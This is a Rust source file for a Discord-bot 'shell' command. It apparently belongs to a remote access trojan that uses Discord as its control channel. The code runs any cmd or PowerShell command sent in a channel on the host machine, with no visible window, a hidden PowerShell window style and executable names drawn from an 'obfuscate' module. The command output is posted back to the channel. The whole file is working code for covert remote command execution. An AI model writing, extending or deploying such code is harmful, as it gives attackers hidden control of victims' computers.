use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::os::windows::process::CommandExt;
use std::process::Stdio;
use tokio::process::Command;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;

pub struct ShellCommand;

#[async_trait]
impl BotCommand for ShellCommand {
    fn name(&self) -> &str { "shell" }
    fn description(&self) -> &str { "Execute Windows shell commands with invisible terminal" }
    fn category(&self) -> &str { "core" }
    fn usage(&self) -> &str { ".shell <cmd|ps> <command>" }
    fn examples(&self) -> &'static [&'static str] { &[".shell cmd dir", ".shell cmd whoami", ".shell ps Get-Process", ".shell ps Get-Location"] }
    fn aliases(&self) -> &'static [&'static str] { &["exec", "run"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let shell_type = args.next().unwrap_or("").to_lowercase();
        let command_str = args.rest();
        let command = command_str.trim();

        if shell_type.is_empty() || command.is_empty() {
            http.create_message(msg.channel_id)
                .content("ERROR: Please specify shell type and command.\nUsage: `.shell <cmd|ps> <command>`\n\nExamples:\n• `.shell cmd dir`\n• `.shell ps Get-Process`")
                .await?;
            return Ok(());
        }

        let output = match shell_type.as_str() {
            "cmd" => self.execute_cmd(command).await,
            "ps" | "powershell" => self.execute_powershell(command).await,
            _ => {
                http.create_message(msg.channel_id)
                    .content("ERROR: Invalid shell type. Use `cmd` or `ps`")
                    .await?;
                return Ok(());
            }
        };

        match output {
            Ok(result) => {
                let formatted_output = format!("```\n{}\n```", result);

                // Discord has a 2000 character limit
                if formatted_output.len() > 1900 {
                    let truncated = &result[..1850];
                    http.create_message(msg.channel_id)
                        .content(&format!("```\n{}\n...\n[Output truncated]\n```", truncated))
                        .await?;
                } else {
                    http.create_message(msg.channel_id)
                        .content(&formatted_output)
                        .await?;
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("ERROR: Command execution failed: {}", e))
                    .await?;
            }
        }

        Ok(())
    }
}

impl ShellCommand {
    async fn execute_cmd(&self, command: &str) -> Result<String> {
        use crate::utils::obfuscate::exe;
        
        let output = Command::new(exe::cmd())
            .args(&["/C", command])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        if output.status.success() {
            Ok(stdout.trim().to_string())
        } else {
            Ok(format!(
                "Exit Code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
                output.status.code().unwrap_or(-1),
                stdout.trim(),
                stderr.trim()
            ))
        }
    }

    async fn execute_powershell(&self, command: &str) -> Result<String> {
        use crate::utils::obfuscate::{exe, powershell};
        
        let output = Command::new(exe::powershell())
            .args(&[
                &powershell::window_style(),
                &powershell::hidden(),
                &powershell::non_interactive(),
                &powershell::command(),
                command,
            ])
            .creation_flags(0x08000000) // CREATE_NO_WINDOW flag
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        if output.status.success() {
            Ok(stdout.trim().to_string())
        } else {
            Ok(format!(
                "Exit Code: {}\nSTDOUT:\n{}\nSTDERR:\n{}",
                output.status.code().unwrap_or(-1),
                stdout.trim(),
                stderr.trim()
            ))
        }
    }
}
